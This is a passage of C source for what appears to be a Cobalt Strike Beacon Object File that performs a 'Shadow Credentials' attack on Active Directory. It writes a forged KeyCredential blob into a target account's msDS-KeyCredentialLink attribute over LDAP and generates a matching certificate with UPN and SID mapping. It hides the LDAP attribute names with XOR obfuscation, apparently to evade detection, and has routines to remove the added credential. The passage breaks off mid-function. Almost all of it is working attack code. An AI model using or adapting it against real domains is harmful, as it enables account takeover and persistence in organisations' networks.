    if (value >= 0 && value < 128) {
        *outLen = 3;
        result = (BYTE*)malloc(3);
        result[0] = 0x02;
        result[1] = 0x01;
        result[2] = (BYTE)value;
    } else if (value >= 0 && value < 256) {
        *outLen = 4;
        result = (BYTE*)malloc(4);
        result[0] = 0x02;
        result[1] = 0x02;
        result[2] = 0x00;
        result[3] = (BYTE)value;
    } else {
        *outLen = 6;
        result = (BYTE*)malloc(6);
        result[0] = 0x02;
        result[1] = 0x04;
        result[2] = (BYTE)(value >> 24);
        result[3] = (BYTE)(value >> 16);
        result[4] = (BYTE)(value >> 8);
        result[5] = (BYTE)value;
    }
    return result;
}

static BYTE* BuildIntegerFromBytes(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    int needPadding = (data[0] & 0x80) ? 1 : 0;
    int totalDataLen = dataLen + needPadding;
    lenSize = EncodeLength(lenBuf, totalDataLen);
    *outLen = 1 + lenSize + totalDataLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x02;
    memcpy(result + 1, lenBuf, lenSize);
    if (needPadding) {
        result[1 + lenSize] = 0x00;
        memcpy(result + 2 + lenSize, data, dataLen);
    } else {
        memcpy(result + 1 + lenSize, data, dataLen);
    }
    return result;
}

static BYTE* BuildOctetString(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, dataLen);
    *outLen = 1 + lenSize + dataLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x04;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, data, dataLen);
    return result;
}

static BYTE* BuildBitString(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, dataLen + 1);
    *outLen = 1 + lenSize + 1 + dataLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x03;
    memcpy(result + 1, lenBuf, lenSize);
    result[1 + lenSize] = 0x00;
    memcpy(result + 2 + lenSize, data, dataLen);
    return result;
}

static BYTE* BuildContextTag(int tagNum, BYTE* content, int contentLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0xA0 | tagNum;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);
    return result;
}

static BYTE* BuildApplication(int appNum, BYTE* content, int contentLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x60 | appNum;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);
    return result;
}

static BYTE* BuildGeneralString(const char* str, int* outLen) {
    int strLen = (int)strlen(str);
    int lenSize;
    BYTE lenBuf[4];
    BYTE* result;
    lenSize = EncodeLength(lenBuf, strLen);
    *outLen = 1 + lenSize + strLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x1B;
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, str, strLen);
    return result;
}

static BYTE* BuildGeneralizedTime(const char* timeStr, int* outLen) {
    int strLen = (int)strlen(timeStr);
    BYTE* result;
    *outLen = 2 + strLen;
    result = (BYTE*)malloc(*outLen);
    result[0] = 0x18;
    result[1] = (BYTE)strLen;
    memcpy(result + 2, timeStr, strLen);
    return result;
}

/*
 * =============================================================================
 * SHA-256 Hash Function
 * =============================================================================
 */

static BOOL ComputeSha256(BYTE* data, int dataLen, BYTE* hash) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    DWORD hashLen = 32;
    BOOL result = FALSE;

    if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            if (CryptHashData(hHash, data, dataLen, 0)) {
                if (CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
                    result = TRUE;
                }
            }
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    return result;
}

static void ComputeSha1(BYTE* data, int dataLen, BYTE* hash) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    DWORD hashLen = 20;
    if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            CryptHashData(hHash, data, dataLen, 0);
            CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
}

/*
 * =============================================================================
 * KeyCredential Blob Builder
 * =============================================================================
 */

static BYTE* BuildKeyCredentialEntry(BYTE identifier, BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    *outLen = 3 + dataLen;
    result = (BYTE*)malloc(*outLen);
    /* Length (2 bytes, little-endian) + Type (1 byte) + Data */
    result[0] = (BYTE)(dataLen & 0xFF);
    result[1] = (BYTE)((dataLen >> 8) & 0xFF);
    result[2] = identifier;
    memcpy(result + 3, data, dataLen);
    return result;
}

static BYTE* BuildKeyCredentialBlob(BYTE* publicKey, int publicKeyLen, GUID* deviceId, int* outLen) {
    BYTE* result;
    BYTE* binaryProperties;
    int bpLen = 0;
    BYTE keyId[32];
    BYTE keyHash[32];
    FILETIME ft;
    BYTE customKeyInfo[2] = { 0x01, 0x00 };  /* Version=1, Flags=0 */
    BYTE keyUsage[1] = { KEY_USAGE_NGC };
    BYTE keySource[1] = { KEY_SOURCE_AD };
    int offset;

    /* Build entries for hashing (all entries after KeyHash) */
    BYTE* keyMaterialEntry;
    BYTE* keyUsageEntry;
    BYTE* keySourceEntry;
    BYTE* deviceIdEntry;
    BYTE* customKeyInfoEntry;
    BYTE* lastLogonEntry;
    BYTE* creationEntry;
    int kmLen, kuLen, ksLen, diLen, ckiLen, llLen, ctLen;

    GetSystemTimeAsFileTime(&ft);
    BYTE fileTimeBytes[8];
    memcpy(fileTimeBytes, &ft, 8);

    keyMaterialEntry = BuildKeyCredentialEntry(KCEI_KEYMATERIAL, publicKey, publicKeyLen, &kmLen);
    keyUsageEntry = BuildKeyCredentialEntry(KCEI_KEYUSAGE, keyUsage, 1, &kuLen);
    keySourceEntry = BuildKeyCredentialEntry(KCEI_KEYSOURCE, keySource, 1, &ksLen);
    deviceIdEntry = BuildKeyCredentialEntry(KCEI_DEVICEID, (BYTE*)deviceId, 16, &diLen);
    customKeyInfoEntry = BuildKeyCredentialEntry(KCEI_CUSTOMKEYINFO, customKeyInfo, 2, &ckiLen);
    lastLogonEntry = BuildKeyCredentialEntry(KCEI_KEYLASTLOGON, fileTimeBytes, 8, &llLen);
    creationEntry = BuildKeyCredentialEntry(KCEI_KEYCREATION, fileTimeBytes, 8, &ctLen);

    /* Concatenate all entries for hash */
    bpLen = kmLen + kuLen + ksLen + diLen + ckiLen + llLen + ctLen;
    binaryProperties = (BYTE*)malloc(bpLen);
    offset = 0;
    memcpy(binaryProperties + offset, keyMaterialEntry, kmLen); offset += kmLen;
    memcpy(binaryProperties + offset, keyUsageEntry, kuLen); offset += kuLen;
    memcpy(binaryProperties + offset, keySourceEntry, ksLen); offset += ksLen;
    memcpy(binaryProperties + offset, deviceIdEntry, diLen); offset += diLen;
    memcpy(binaryProperties + offset, customKeyInfoEntry, ckiLen); offset += ckiLen;
    memcpy(binaryProperties + offset, lastLogonEntry, llLen); offset += llLen;
    memcpy(binaryProperties + offset, creationEntry, ctLen); offset += ctLen;

    /* KeyID = SHA256(publicKey) */
    ComputeSha256(publicKey, publicKeyLen, keyId);

    /* KeyHash = SHA256(binaryProperties) */
    ComputeSha256(binaryProperties, bpLen, keyHash);

    /* Build final blob: Version + KeyID + KeyHash + binaryProperties */
    BYTE* keyIdEntry;
    BYTE* keyHashEntry;
    int kiLen, khLen;

    keyIdEntry = BuildKeyCredentialEntry(KCEI_KEYID, keyId, 32, &kiLen);
    keyHashEntry = BuildKeyCredentialEntry(KCEI_KEYHASH, keyHash, 32, &khLen);

    *outLen = 4 + kiLen + khLen + bpLen;
    result = (BYTE*)malloc(*outLen);

    /* Version 0x200 (little-endian) */
    result[0] = 0x00;
    result[1] = 0x02;
    result[2] = 0x00;
    result[3] = 0x00;

    offset = 4;
    memcpy(result + offset, keyIdEntry, kiLen); offset += kiLen;
    memcpy(result + offset, keyHashEntry, khLen); offset += khLen;
    memcpy(result + offset, binaryProperties, bpLen);

    /* Cleanup */
    free(keyMaterialEntry);
    free(keyUsageEntry);
    free(keySourceEntry);
    free(deviceIdEntry);
    free(customKeyInfoEntry);
    free(lastLogonEntry);
    free(creationEntry);
    free(keyIdEntry);
    free(keyHashEntry);
    free(binaryProperties);

    return result;
}

/*
 * =============================================================================
 * RSA Key Export in BCRYPT_RSAKEY_BLOB Format
 * =============================================================================
 */

static BYTE* ExportRSAPublicKeyBCrypt(HCRYPTKEY hKey, int* outLen) {
    BYTE* pubKeyBlob = NULL;
    DWORD pubKeyBlobLen = 0;
    BYTE* bcryptBlob = NULL;

    /* Export in PUBLICKEYBLOB format */
    if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, NULL, &pubKeyBlobLen)) {
        return NULL;
    }

    pubKeyBlob = (BYTE*)malloc(pubKeyBlobLen);
    if (!CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, pubKeyBlob, &pubKeyBlobLen)) {
        free(pubKeyBlob);
        return NULL;
    }

    /* PUBLICKEYBLOB format:
     * BLOBHEADER (8 bytes) + RSAPUBKEY (12 bytes) + modulus (bitlen/8 bytes)
     * RSAPUBKEY: magic (4) + bitlen (4) + pubexp (4)
     */
    DWORD bitLen = *(DWORD*)(pubKeyBlob + 12);
    DWORD modulusLen = bitLen / 8;
    DWORD exponent = *(DWORD*)(pubKeyBlob + 16);
    BYTE* modulus = pubKeyBlob + 20;

    /* Build BCRYPT_RSAKEY_BLOB */
    /* BCRYPT_RSAKEY_BLOB: Magic(4) + BitLength(4) + cbPublicExp(4) + cbModulus(4) + cbPrime1(4) + cbPrime2(4) + Exponent + Modulus */
    int expLen = 3;  /* exponent 65537 = 0x010001 = 3 bytes */
    *outLen = 24 + expLen + modulusLen;
    bcryptBlob = (BYTE*)malloc(*outLen);

    *(DWORD*)(bcryptBlob + 0) = BCRYPT_RSAPUBLIC_MAGIC;
    *(DWORD*)(bcryptBlob + 4) = bitLen;
    *(DWORD*)(bcryptBlob + 8) = expLen;
    *(DWORD*)(bcryptBlob + 12) = modulusLen;
    *(DWORD*)(bcryptBlob + 16) = 0;  /* cbPrime1 */
    *(DWORD*)(bcryptBlob + 20) = 0;  /* cbPrime2 */

    /* Exponent (big-endian) */
    bcryptBlob[24] = 0x01;
    bcryptBlob[25] = 0x00;
    bcryptBlob[26] = 0x01;

    /* Modulus - need to reverse because CryptoAPI exports little-endian but BCRYPT expects big-endian */
    int i;
    for (i = 0; i < (int)modulusLen; i++) {
        bcryptBlob[27 + i] = modulus[modulusLen - 1 - i];
    }

    free(pubKeyBlob);
    return bcryptBlob;
}

/*
 * =============================================================================
 * String Obfuscation - XOR deobfuscation at runtime
 * =============================================================================
 */

#define XOR_KEY 0x5A

/* Deobfuscate XOR'd wide string in-place */
static void DeobfuscateW(WCHAR* str, int len) {
    int i;
    for (i = 0; i < len; i++) {
        str[i] ^= XOR_KEY;
    }
}

/* Deobfuscate XOR'd byte string in-place */
static void DeobfuscateA(char* str, int len) {
    int i;
    for (i = 0; i < len; i++) {
        str[i] ^= XOR_KEY;
    }
}

/* Build obfuscated LDAP attribute names at runtime */
static void GetObfuscatedStrings(WCHAR* samAccountName, WCHAR* distinguishedName,
                                  WCHAR* objectSid, WCHAR* keyCredLink) {
    /* "sAMAccountName" XOR 0x5A */
    /* s=0x29 A=0x1B M=0x17 A=0x1B c=0x39 c=0x39 o=0x35 u=0x2F n=0x34 t=0x2E N=0x14 a=0x3B m=0x37 e=0x3F */
    WCHAR sam[] = { 0x29, 0x1B, 0x17, 0x1B, 0x39, 0x39, 0x35, 0x2F, 0x34, 0x2E,
                    0x14, 0x3B, 0x37, 0x3F, 0x00 };
    /* "distinguishedName" XOR 0x5A */
    /* d=0x3E i=0x33 s=0x29 t=0x2E i=0x33 n=0x34 g=0x3D u=0x2F i=0x33 s=0x29 h=0x32 e=0x3F d=0x3E N=0x14 a=0x3B m=0x37 e=0x3F */
    WCHAR dn[] = { 0x3E, 0x33, 0x29, 0x2E, 0x33, 0x34, 0x3D, 0x2F, 0x33, 0x29,
                   0x32, 0x3F, 0x3E, 0x14, 0x3B, 0x37, 0x3F, 0x00 };
    /* "objectSid" XOR 0x5A */
    /* o=0x35 b=0x38 j=0x30 e=0x3F c=0x39 t=0x2E S=0x09 i=0x33 d=0x3E */
    WCHAR sid[] = { 0x35, 0x38, 0x30, 0x3F, 0x39, 0x2E, 0x09, 0x33, 0x3E, 0x00 };
    /* "msDS-KeyCredentialLink" XOR 0x5A */
    /* m=0x37 s=0x29 D=0x1E S=0x09 -=0x77 K=0x11 e=0x3F y=0x23 C=0x19 r=0x28 e=0x3F d=0x3E e=0x3F n=0x34 t=0x2E i=0x33 a=0x3B l=0x36 L=0x16 i=0x33 n=0x34 k=0x31 */
    WCHAR kcl[] = { 0x37, 0x29, 0x1E, 0x09, 0x77, 0x11, 0x3F, 0x23, 0x19, 0x28,
                    0x3F, 0x3E, 0x3F, 0x34, 0x2E, 0x33, 0x3B, 0x36, 0x16, 0x33,
                    0x34, 0x31, 0x00 };

    wcscpy(samAccountName, sam);
    DeobfuscateW(samAccountName, 14);

    wcscpy(distinguishedName, dn);
    DeobfuscateW(distinguishedName, 17);

    wcscpy(objectSid, sid);
    DeobfuscateW(objectSid, 9);

    wcscpy(keyCredLink, kcl);
    DeobfuscateW(keyCredLink, 22);
}

/*
 * =============================================================================
 * LDAP Functions - Search for target and write attribute
 * =============================================================================
 */

static BOOL LookupUserDNAndSID(const char* szTarget, const char* szDomain,
                                WCHAR* wszTargetDN, int dnLen, BYTE** ppSid, DWORD* pdwSidLen) {
    LDAP* pLdap = NULL;
    LDAPMessage* pResults = NULL;
    LDAPMessage* pEntry = NULL;
    struct berval** ppValues = NULL;
    WCHAR* wszDomain = NULL;
    WCHAR* wszBaseDN = NULL;
    WCHAR* wszFilter = NULL;
    WCHAR* wszTarget = NULL;
    WCHAR wszSamAccountName[32];
    WCHAR wszDistinguishedName[32];
    WCHAR wszObjectSid[16];
    WCHAR wszKeyCredLink[32];
    WCHAR* attrs[3];

    /* Deobfuscate attribute names */
    GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);
    attrs[0] = wszDistinguishedName;
    attrs[1] = wszObjectSid;
    attrs[2] = NULL;
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    ULONG ulOff = 0;

    *ppSid = NULL;
    *pdwSidLen = 0;
    wszTargetDN[0] = L'\0';

    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    wszBaseDN = (WCHAR*)malloc(512 * sizeof(WCHAR));
    wszFilter = (WCHAR*)malloc(512 * sizeof(WCHAR));
    wszTarget = (WCHAR*)malloc(256 * sizeof(WCHAR));

    if (!wszDomain || !wszBaseDN || !wszFilter || !wszTarget) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to allocate memory");
        goto cleanup;
    }

    memset(wszDomain, 0, 256 * sizeof(WCHAR));
    memset(wszBaseDN, 0, 512 * sizeof(WCHAR));
    memset(wszFilter, 0, 512 * sizeof(WCHAR));
    memset(wszTarget, 0, 256 * sizeof(WCHAR));

    MultiByteToWideChar(CP_UTF8, 0, szDomain, -1, wszDomain, 256);
    MultiByteToWideChar(CP_UTF8, 0, szTarget, -1, wszTarget, 256);

    /* Build base DN from domain */
    {
        WCHAR* pSrc = wszDomain;
        WCHAR* pDst = wszBaseDN;
        WCHAR* pSegStart = pSrc;
        while (*pSrc) {
            if (*pSrc == L'.') {
                wcscpy(pDst, L"DC=");
                pDst += 3;
                while (pSegStart < pSrc) *pDst++ = *pSegStart++;
                *pDst++ = L',';
                pSegStart = pSrc + 1;
            }
            pSrc++;
        }
        wcscpy(pDst, L"DC=");
        pDst += 3;
        while (*pSegStart) *pDst++ = *pSegStart++;
        *pDst = L'\0';
    }

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_init failed");
        goto cleanup;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_bind_s failed: %u", ulResult);
        ldap_unbind(pLdap);
        goto cleanup;
    }

    /* Search by sAMAccountName (using deobfuscated string) */
    SWPRINTF(wszFilter, L"(%s=%s)", wszSamAccountName, wszTarget);
    ulResult = ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_search_s failed: %u", ulResult);
        ldap_unbind(pLdap);
        goto cleanup;
    }

    pEntry = ldap_first_entry(pLdap, pResults);
    if (!pEntry) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Target not found: %s (search returned 0 results)", szTarget);
        ldap_msgfree(pResults);
        ldap_unbind(pLdap);
        goto cleanup;
    }

    /* Get DN */
    PWSTR dn = ldap_get_dnW(pLdap, pEntry);
    if (dn) {
        wcscpy(wszTargetDN, dn);
        ldap_memfreeW(dn);
    }

    /* Get SID (using deobfuscated attribute name) */
    ppValues = ldap_get_values_lenW(pLdap, pEntry, wszObjectSid);
    if (ppValues && ppValues[0] && ppValues[0]->bv_len > 0) {
        if (IsValidSid((PSID)ppValues[0]->bv_val)) {
            DWORD dwSidLen = GetLengthSid((PSID)ppValues[0]->bv_val);
            *ppSid = (BYTE*)malloc(dwSidLen);
            if (*ppSid) {
                memcpy(*ppSid, ppValues[0]->bv_val, dwSidLen);
                *pdwSidLen = dwSidLen;
            }
        }
        ldap_value_free_len(ppValues);
    }

    ldap_msgfree(pResults);
    ldap_unbind(pLdap);
    bSuccess = TRUE;

cleanup:
    if (wszDomain) free(wszDomain);
    if (wszBaseDN) free(wszBaseDN);
    if (wszFilter) free(wszFilter);
    if (wszTarget) free(wszTarget);
    return bSuccess;
}

static BOOL WriteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN, BYTE* keyCredBlob, int blobLen) {
    LDAP* pLdap = NULL;
    WCHAR* wszDomain = NULL;
    LDAPModW* mods[2];
    LDAPModW mod;
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    ULONG ulOff = 0;
    WCHAR wszSamAccountName[32];
    WCHAR wszDistinguishedName[32];
    WCHAR wszObjectSid[16];
    WCHAR wszKeyCredLink[32];

    /* Deobfuscate attribute name */
    GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);

    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    if (!wszDomain) return FALSE;

    MultiByteToWideChar(CP_UTF8, 0, szDomain, -1, wszDomain, 256);

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_init failed for write");
        free(wszDomain);
        return FALSE;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_bind_s failed for write: %u", ulResult);
        ldap_unbind(pLdap);
        free(wszDomain);
        return FALSE;
    }

    /* Prepare modification - attribute is a DNWithBinary type */
    /* Format: B:<hex_length>:<hex_blob>:<DN> */
    int hexLen = blobLen * 2;
    WCHAR* wszValue = (WCHAR*)malloc((32 + hexLen + wcslen(wszTargetDN) + 1) * sizeof(WCHAR));
    WCHAR* strVals[2];
    if (!wszValue) {
        ldap_unbind(pLdap);
        free(wszDomain);
        return FALSE;
    }

    /* Build DNWithBinary string */
    SWPRINTF(wszValue, L"B:%d:", hexLen);
    int pos = (int)wcslen(wszValue);
    int i;
    for (i = 0; i < blobLen; i++) {
        SWPRINTF(wszValue + pos + i*2, L"%02X", keyCredBlob[i]);
    }
    wcscat(wszValue, L":");
    wcscat(wszValue, wszTargetDN);

    /* Use string values, not binary */
    strVals[0] = wszValue;
    strVals[1] = NULL;

    mod.mod_op = LDAP_MOD_ADD;
    mod.mod_type = wszKeyCredLink;  /* Use deobfuscated attribute name */
    mod.mod_vals.modv_strvals = strVals;

    mods[0] = &mod;
    mods[1] = NULL;

    ulResult = ldap_modify_sW(pLdap, wszTargetDN, mods);
    if (ulResult == LDAP_SUCCESS) {
        bSuccess = TRUE;
        /* Save the value for later cleanup */
        int valLen = (int)wcslen(wszValue) + 1;
        g_wszKeyCredValue = (WCHAR*)malloc(valLen * sizeof(WCHAR));
        if (g_wszKeyCredValue) {
            wcscpy(g_wszKeyCredValue, wszValue);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_modify_s failed: %u", ulResult);
    }

    ldap_unbind(pLdap);
    free(wszValue);
    free(wszDomain);
    return bSuccess;
}

static BOOL DeleteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN) {
    LDAP* pLdap = NULL;
    WCHAR* wszDomain = NULL;
    LDAPModW* mods[2];
    LDAPModW mod;
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    ULONG ulOff = 0;
    WCHAR wszSamAccountName[32];
    WCHAR wszDistinguishedName[32];
    WCHAR wszObjectSid[16];
    WCHAR wszKeyCredLink[32];

    if (!g_wszKeyCredValue) {
        return FALSE;
    }

    /* Deobfuscate attribute name */
    GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);

    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    if (!wszDomain) return FALSE;

    MultiByteToWideChar(CP_UTF8, 0, szDomain, -1, wszDomain, 256);

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        free(wszDomain);
        return FALSE;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        ldap_unbind(pLdap);
        free(wszDomain);
        return FALSE;
    }

    /* Use the saved value for deletion */
    WCHAR* strVals[2];
    strVals[0] = g_wszKeyCredValue;
    strVals[1] = NULL;

    mod.mod_op = LDAP_MOD_DELETE;
    mod.mod_type = wszKeyCredLink;
    mod.mod_vals.modv_strvals = strVals;

    mods[0] = &mod;
    mods[1] = NULL;

    ulResult = ldap_modify_sW(pLdap, wszTargetDN, mods);
    if (ulResult == LDAP_SUCCESS) {
        bSuccess = TRUE;
    }

    ldap_unbind(pLdap);
    free(wszDomain);
    return bSuccess;
}

/*
 * =============================================================================
 * Certificate Generation with UPN SAN
 * =============================================================================
 */

/* Forward declaration */
static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* szCN,
                                     const char* szUPN, const char* szSID, WCHAR* wszContainerName,
                                     int* certLen, int* pfxLen);

static BYTE* GenerateCertificateAndKey(const char* szCN, const char* szDomain, const char* szSID,
                                       BYTE** ppPublicKey, int* pPublicKeyLen,
                                       BYTE** ppPfx, int* pPfxLen, GUID* pDeviceId) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    WCHAR wszContainerName[64];
    BYTE* publicKey = NULL;
    BYTE* certData = NULL;
    int certLen = 0;
    char szUPN[256];

    /* Generate container name */
    CoCreateGuid(pDeviceId);
    SWPRINTF(wszContainerName, L"ShadowCred_%08X%04X", pDeviceId->Data1, pDeviceId->Data2);

    /* Create crypto context */
    if (!CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
        if (GetLastError() == NTE_EXISTS) {
            if (!CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W, PROV_RSA_FULL, 0)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW failed: 0x%08X", GetLastError());
                return NULL;
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW failed: 0x%08X", GetLastError());
            return NULL;
        }
    }

    /* Generate 2048-bit RSA key */
    if (!CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptGenKey failed: 0x%08X", GetLastError());
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    /* Export public key in BCRYPT format */
    publicKey = ExportRSAPublicKeyBCrypt(hKey, pPublicKeyLen);
    if (!publicKey) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to export public key");
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }
    *ppPublicKey = publicKey;

    /* Build UPN */
    sprintf(szUPN, "%s@%s", szCN, szDomain);

    /* Generate certificate with UPN SAN */
    certData = BuildCertificateWithKey(hProv, hKey, szCN, szUPN, szSID, wszContainerName, &certLen, pPfxLen);
    *ppPfx = certData;

    CryptDestroyKey(hKey);
    /* Don't release context - needed for certificate operations */

    return publicKey;
}

/*
 * =============================================================================
 * Certificate Building with Extensions
 * =============================================================================
 */

static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* szCN,
                                     const char* szUPN, const char* szSID, WCHAR* wszContainerName,
                                     int* certLen, int* pfxLen) {
    CERT_REQUEST_INFO reqInfo;
    BYTE* pbSubject = NULL;
    DWORD cbSubject = 0;
    char szSubjectCN[256];
    BYTE* pbEncodedUPN = NULL;
    DWORD cbEncodedUPN = 0;
    CERT_OTHER_NAME otherName;
    CERT_ALT_NAME_ENTRY altNameEntries[2];
    CERT_ALT_NAME_INFO altNameInfo;
    DWORD dwAltNameCount = 1;
    BYTE* pbEncodedSAN = NULL;
    DWORD cbEncodedSAN = 0;
    CERT_EXTENSION extensions[2];
    DWORD extCount = 0;
    BYTE* pbEncodedEKU = NULL;
    DWORD cbEncodedEKU = 0;
    CERT_ENHKEY_USAGE eku;
    LPSTR ekuOids[2];
    CERT_PUBLIC_KEY_INFO* pPubKeyInfo = NULL;
    DWORD dwPubKeyInfoLen = 0;
    CRYPT_ALGORITHM_IDENTIFIER sigAlgo;
    BYTE* pbEncodedCert = NULL;
    DWORD cbEncodedCert = 0;
    CERT_INFO certInfo;
    SYSTEMTIME stNow, stExpire;
    HCERTSTORE hMemStore = NULL;
    PCCERT_CONTEXT pCertContext = NULL;
    CRYPT_KEY_PROV_INFO keyProvInfo;
    CRYPT_DATA_BLOB pfxBlob;
    BYTE* resultPfx = NULL;
    static WCHAR wszSidUrl[256];

    memset(&reqInfo, 0, sizeof(reqInfo));
    memset(altNameEntries, 0, sizeof(altNameEntries));
    memset(&altNameInfo, 0, sizeof(altNameInfo));
    memset(&certInfo, 0, sizeof(certInfo));
    memset(&keyProvInfo, 0, sizeof(keyProvInfo));
    memset(&pfxBlob, 0, sizeof(pfxBlob));
    memset(&sigAlgo, 0, sizeof(sigAlgo));

    /* Build subject DN */
    sprintf(szSubjectCN, "CN=%s", szCN);
    if (!CertStrToNameA(X509_ASN_ENCODING, szSubjectCN, CERT_X500_NAME_STR, NULL, NULL, &cbSubject, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertStrToNameA size failed");
        return NULL;
    }
    pbSubject = (BYTE*)malloc(cbSubject);
    if (!CertStrToNameA(X509_ASN_ENCODING, szSubjectCN, CERT_X500_NAME_STR, NULL, pbSubject, &cbSubject, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertStrToNameA failed");
        free(pbSubject);
        return NULL;
    }

    /* Build SAN extension with UPN */
    {
        DWORD upnLen = (DWORD)strlen(szUPN);
        DWORD totalLen = (upnLen < 128) ? (2 + upnLen) : (4 + upnLen);
        BYTE* p;

        cbEncodedUPN = totalLen;
        pbEncodedUPN = (BYTE*)malloc(cbEncodedUPN);
        p = pbEncodedUPN;
        *p++ = 0x0C;  /* UTF8String */
        if (upnLen < 128) {
            *p++ = (BYTE)upnLen;
        } else {
            *p++ = 0x82;
            *p++ = (BYTE)(upnLen >> 8);
            *p++ = (BYTE)(upnLen & 0xFF);
        }
        memcpy(p, szUPN, upnLen);
    }

    otherName.pszObjId = (LPSTR)szOID_NT_PRINCIPAL_NAME;
    otherName.Value.cbData = cbEncodedUPN;
    otherName.Value.pbData = pbEncodedUPN;

    altNameEntries[0].dwAltNameChoice = CERT_ALT_NAME_OTHER_NAME;
    altNameEntries[0].pOtherName = &otherName;
    dwAltNameCount = 1;

    /* Add SID URL for KB5014754 strong mapping if provided */
    if (szSID && szSID[0]) {
        char szSidUrl[256];
        sprintf(szSidUrl, "tag:microsoft.com,2022-09-14:sid:%s", szSID);
